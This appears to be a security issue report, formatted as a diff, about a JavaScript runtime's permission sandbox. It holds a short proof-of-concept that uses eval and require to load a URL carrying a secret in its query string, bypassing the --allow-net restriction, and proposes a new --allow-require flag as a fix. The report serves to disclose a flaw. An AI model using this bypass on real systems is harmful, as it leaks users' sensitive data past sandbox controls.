@@ -1,0 +1,14 @@
+yes
+```
+eval(`require(["http://localhost:8080/a.ts?secret=value"], () => {
+  console.log("Done");
+})`);
+
+export const x = null;
+```
+
+As shown above, an attacker can still send user's sensitive data to somewhere online even when the user does not provide the --allow-net option.
+
+Possible soloution:
+
+We can provide a new flag (e.x: --allow-require) and return null from _makeLocalRequire() unless user provides that flag.
